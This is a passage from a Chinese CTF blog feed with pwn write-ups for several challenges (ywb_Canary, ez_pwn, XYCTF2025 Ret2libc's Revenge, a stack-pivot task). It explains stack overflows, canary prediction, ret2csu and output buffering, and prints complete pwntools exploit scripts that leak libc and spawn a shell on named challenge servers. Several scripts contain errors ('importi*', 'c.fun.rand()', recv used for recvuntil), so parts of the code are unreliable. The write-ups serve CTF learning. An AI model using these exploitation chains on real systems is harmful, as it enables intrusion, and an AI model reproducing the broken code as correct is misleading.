class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;47.105.113.86&#x27;</span>,<span class="number">30001</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./ywb_Canary&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Input your choice\n&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Show me the code:\n&#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line">sys_add=<span class="number">0x401581</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x58</span>+<span class="number">0x14</span>)+p32(<span class="number">0</span>)+p64(<span class="number">0xdeadbeef</span>)+p64(sys_add)</span><br><span class="line">payload1=payload1.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">send(payload1)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Input your choice\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Input your choice\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>爆破做法的wp如下<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;47.105.113.86&#x27;</span>,<span class="number">30001</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./ywb_Canary&#x27;</span>)</span><br><span class="line">cfun=cdll.LoadLibrary(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Input your choice\n&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Show me the code:\n&#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line">sys_add=<span class="number">0x401581</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Input your choice\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;My secret is &#x27;</span>)</span><br><span class="line">target=r.recvline()</span><br><span class="line">canary=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xffffff</span>):</span><br><span class="line">    cfun.srand(i)</span><br><span class="line">    temp=cfun.rand() &lt;&lt; <span class="number">32</span></span><br><span class="line">    temp+=cfun.rand()</span><br><span class="line">    temp=<span class="string">&quot;%016x&quot;</span> % temp <span class="comment">#将temp转为16字节长度的16进制字符串，因为泄露的canary也是这个格式</span></span><br><span class="line">    <span class="keyword">if</span> temp==target :</span><br><span class="line">        canary=cfun.rand() &lt;&lt; <span class="number">32</span></span><br><span class="line">        canary+=c.fun.rand()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span>+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x6</span>+p32(<span class="number">0</span>)+p64(<span class="number">0xdeadbeef</span>)+p64(sys_add)</span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">send(payload)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Input your choice\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="ez-pwn"><a href="#ez-pwn" class="headerlink" title="ez_pwn"></a>ez_pwn</h2><h3 id="复盘-ret2libc-重定向-ret2csu"><a href="#复盘-ret2libc-重定向-ret2csu" class="headerlink" title="复盘&#x2F;ret2libc&#x2F;重定向&#x2F;ret2csu"></a>复盘&#x2F;ret2libc&#x2F;重定向&#x2F;ret2csu</h3><p>题目源码如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init();</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Close your eye, and you are blind now.&quot;</span>, <span class="number">0x26u</span>LL);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vuln函数<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x200u</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>明显的栈溢出但是禁用了标准输出，但是2没有禁用（标准错误输出），我们可以调用write函数传2为第一个参数(文件描述符2表示标准错误输出)来泄露libc<br>然后write函数有三个参数，第三个参数rdx的控制片段较难寻找。此题中rdx因为此前程序自身调用了read函数读入0x200，我们知道rdx已经是0x200，可以直接使用<br>尽管如此我们还是分析一下一种控制rdx，同时也能控制rdi和rsi的方法，称为ret2csu<br>一般程序中都存在__libc_csu_init这个函数。在这个函数中，有如下片段(以此题为例)：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004012A0                 mov     rdx, r14</span><br><span class="line">.text:00000000004012A3                 mov     rsi, r13</span><br><span class="line">.text:00000000004012A6                 mov     edi, r12d</span><br><span class="line">.text:00000000004012A9                 call    ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8]</span><br><span class="line">.text:00000000004012AD                 add     rbx, 1</span><br><span class="line">.text:00000000004012B1                 cmp     rbp, rbx</span><br><span class="line">.text:00000000004012B4                 jnz     short loc_4012A0</span><br><span class="line">```gadget2</span><br><span class="line">.text:00000000004012BA                 pop     rbx</span><br><span class="line">.text:00000000004012BB                 pop     rbp</span><br><span class="line">.text:00000000004012BC                 pop     r12</span><br><span class="line">.text:00000000004012BE                 pop     r13</span><br><span class="line">.text:00000000004012C0                 pop     r14</span><br><span class="line">.text:00000000004012C2                 pop     r15</span><br><span class="line">.text:00000000004012C4                 retn</span><br></pre></td></tr></table></figure><p>我们分析一下这两个片段就可以知道，通过gadget2中可传值的r14,r13,r12以及gadget1的前三条指令可以间接控制rdx,rsi,edi<br><br>在gadget2中，我们call了 [r15+rbx<em>8] ，将rbx置为0即 [r15+rbx</em>8] &#x3D;&#x3D; [r15]，方便我们用r15控制调用的函数。<br>后续add rbx, 1; cmp rbx, rbp; jnz xxxxxx。我们已经令rbx&#x3D;0，从而使r15+rbx*8&#x3D;r15，所以add rbx,1后rbx&#x3D;1，若此时rbp !&#x3D; 1，jnz触发可能会产生错误，为了避免不必要的麻烦，我们令rbp也为1（gadget2可以控制rbp）。最后我们把目标函数地址传入r15，也就成功劫持了程序执行流。<br>除了这种通用的方法以外，还有一个巧妙的方法,gadget2中其实隐藏了两个简单的gadget<br>pop r15;ret的机器码转为16进制为(0x41 0x5F 0xC3)，而pop rdi;ret的机器码为(0x5F 0xC3),后两个字节一模一样，说明pop r15;ret指令可以通过控制指令开始的地址变为pop rdi;ret。以此题为例子，pop r15的地址是0x4012C2，那么pop rdi的地址是pop r15的地址加一，即0x4012C3<br>同理我们看pop r14的机器码为（0x41 0x5E），而pop rsi的机器码正好为0x5E，以此题为例，pop r14的地址(0x4012C0)加一就是pop rsi指令的地址，也就是0x4012C1。<br>这两个隐藏gadget如何使用呢？以此题为例子，只需要布置rop链，ret到0x4012C1，也就是pop rsi，然后加上两个数据，分别pop进rsi和r15，然后ret到0x4012C3，也就是pop rdi，再加上要传入rdi的数据，再ret到目标函数即可。<br><br>话说回来，继续分析这个题目，在用write函数泄露libc并getshell后，标准输入还是禁用状态，我们需要输入指令exec 1&gt;&amp;0，将标准输出重定向到标准输入，在执行这个命令后，进程的标准输出将不再向终端屏幕上显示，而是会将输出结果发送到标准输入。这意味着，后续的输出会被作为输入来处理。相当于重启了标准输出。还可以通过调用dup2函数来重定向（搬运的解释，以后学IO_FILE再看看）<br><br>wp<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn importi*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r=process(&#x27;./ywb_pwn&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&#x27;47.105.113.86&#x27;</span>,<span class="number">30003</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./ywb_pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">write_plt=e.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=e.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_add=<span class="number">0x401207</span></span><br><span class="line">pop_rdi=<span class="number">0x4012c3</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x4012c1</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span>+p64(pop_rdi)+p64(<span class="number">2</span>)+p64(pop_rsi_r15)+p64(write_got)+p64(<span class="number">0</span>)+p64(write_plt)+p64(main_add)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Close your eye, and you are blind now.&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.send(payload.ljust(<span class="number">0x200</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">write_leak_add=u64(r.recv(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">0x8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="built_in">hex</span>(write_leak_add))</span><br><span class="line">libcbase=write_leak_add-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">sys_add=libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_add=libcbase+<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">32</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(bin_add)+p64(ret)+p64(sys_add)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.send(payload.ljust(<span class="number">0x200</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> stack </category>
          
          <category> ROP </category>
          
          <category> canary </category>
          
          <category> ret2libc </category>
          
          <category> 伪随机数 </category>
          
          <category> ret2csu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复盘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XYCTF2025</title>
      <link href="/2025/05/02/XYCTF2025/"/>
      <url>/2025/05/02/XYCTF2025/</url>
      
        <content type="html"><![CDATA[<h2 id="Ret2libc’s-Revenge"><a href="#Ret2libc’s-Revenge" class="headerlink" title="Ret2libc’s Revenge"></a>Ret2libc’s Revenge</h2><h3 id="复现-ret2libc-全缓冲"><a href="#复现-ret2libc-全缓冲" class="headerlink" title="复现&#x2F;ret2libc&#x2F;全缓冲"></a>复现&#x2F;ret2libc&#x2F;全缓冲</h3><p>源码如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ret2libc&#x27;s Revenge&quot;</span>);</span><br><span class="line">  revenge();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">__int64 <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line">__int64 <span class="title function_">revenge</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v2[<span class="number">528</span>]; <span class="comment">// [rsp+0h] [rbp-220h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+210h] [rbp-10h]</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+217h] [rbp-9h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+218h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+21Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( !feof(<span class="built_in">stdin</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = fgetc(<span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v0 = v6++;</span><br><span class="line">    v5 = v0;</span><br><span class="line">    v2[v0] = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = v6;</span><br><span class="line">  v2[v6] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为没有发现全缓冲，导致一直leak失败，其实其他思路都没有问题<br>打ret2libc，但是我们试运行程序时候发现当我们输入完之后才会输出Ret2libc’s Revenge，为什么？<br>原来setvbuf将stdout设置为了0，<strong>全缓冲模式，只有当输出缓冲区满了或者调用fflush函数才会输出内容</strong><br>我们这里没有fflush函数可以调用，于是只有填满缓冲区，我们找到text段的puts如下<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040128D                 lea     rdi, s          ; &quot;Ret2libc&#x27;s Revenge&quot;</span><br><span class="line">.text:0000000000401294                 call    _puts</span><br></pre></td></tr></table></figure><p>通过不断调用这一片段来不断填充输出缓冲区直至填满<br>注意我们构造payload时向栈中写入数据的索引v6也在栈上，当我们写入到v6的位置时，我们直接覆盖v6的低字节，以实现跳过。v6在rbp-4处，返回地址在rbp+8处，我们写入到v6时，v6为0x21c，我们写入一字节的0x28，将v6改为0x228，这样后续写入的字节便是直接从返回地址开始填充了<br>至于gadget的寻找，我们利用ROPgadget并没有找到可以直接控制rdi的片段，于是我们手动找到了可以间接控制rdi的片段<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401180                 mov     rdi, rsi</span><br><span class="line">.text:0000000000401183                 retn</span><br></pre></td></tr></table></figure><p>以及</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004010EB                 add     rsi, [rbp+20h]</span><br><span class="line">.text:00000000004010EF                 retn</span><br></pre></td></tr></table></figure><p>以及</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004010E4                 and     rsi, 0</span><br><span class="line">.text:00000000004010E8                 retn</span><br></pre></td></tr></table></figure><p>最后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040117D                 pop     rbp</span><br><span class="line">.text:000000000040117E                 retn</span><br></pre></td></tr></table></figure><p>这些片段结合使用便可以控制rdi<br>缓冲区填满后直接常规泄露libc即可<br>wp<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;gz.imxbt.cn&#x27;</span>,<span class="number">20605</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./attachment&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">puts_got=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_add=<span class="number">0x40127b</span></span><br><span class="line">mov_rdi_rsi=<span class="number">0x401180</span></span><br><span class="line">add_rsi=<span class="number">0x4010eb</span></span><br><span class="line">and_rsi_0=<span class="number">0x4010e4</span></span><br><span class="line">ret=<span class="number">0x401150</span></span><br><span class="line">pop_rbp=<span class="number">0x40117d</span></span><br><span class="line">fake_rbp=<span class="number">0x400600</span>-<span class="number">0x20</span></span><br><span class="line">puts_str = <span class="number">0x40128D</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">528</span>+<span class="number">12</span>)</span><br><span class="line">payload += p8(<span class="number">0x28</span>)</span><br><span class="line">payload += p64(puts_str)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">214</span>):</span><br><span class="line"> r.sendline(payload)</span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">540</span>+p8(<span class="number">0x28</span>)+p64(and_rsi_0)+p64(pop_rbp)+p64(fake_rbp)+p64(add_rsi)+p64(mov_rdi_rsi)+p64(puts_plt)+p64(ret)+p64(and_rsi_0)+p64(pop_rbp)+p64(fake_rbp)+p64(add_rsi)+p64(mov_rdi_rsi)+p64(puts_plt)+p64(main_add)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">215</span>):</span><br><span class="line"> r.recvuntil(<span class="string">b&quot;Ret2libc&#x27;s Revenge\n&quot;</span>)</span><br><span class="line">puts_add=u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libcbase=puts_add-libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">sys_add=libcbase+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_add=libcbase+<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">pop_rdi=libcbase+<span class="number">0x2a3e5</span></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">540</span>+p8(<span class="number">0x28</span>)+p64(pop_rdi)+p64(bin_add)+p64(ret)+p64(sys_add)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="明日方舟寻访模拟器"><a href="#明日方舟寻访模拟器" class="headerlink" title="明日方舟寻访模拟器"></a>明日方舟寻访模拟器</h2><h3 id="复盘-栈迁移-ROP"><a href="#复盘-栈迁移-ROP" class="headerlink" title="复盘&#x2F;栈迁移&#x2F;ROP"></a>复盘&#x2F;栈迁移&#x2F;ROP</h3><p>源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-44h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">44</span>]; <span class="comment">// [rsp+10h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+3Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v7; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+4Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20u</span>LL);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_402C68);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(&amp;byte_402CA0);</span><br><span class="line">          __isoc99_scanf(&amp;unk_402CE3, &amp;v6);</span><br><span class="line">          getchar();</span><br><span class="line">          <span class="keyword">if</span> ( v6 != <span class="number">1</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          employ(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v6 != <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        employ(<span class="number">10</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v6 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">puts</span>(&amp;byte_402CE6);</span><br><span class="line">      __isoc99_scanf(&amp;unk_402CE3, &amp;v4);</span><br><span class="line">      getchar();</span><br><span class="line">      <span class="keyword">if</span> ( v4 &lt;= <span class="number">0x2710</span> 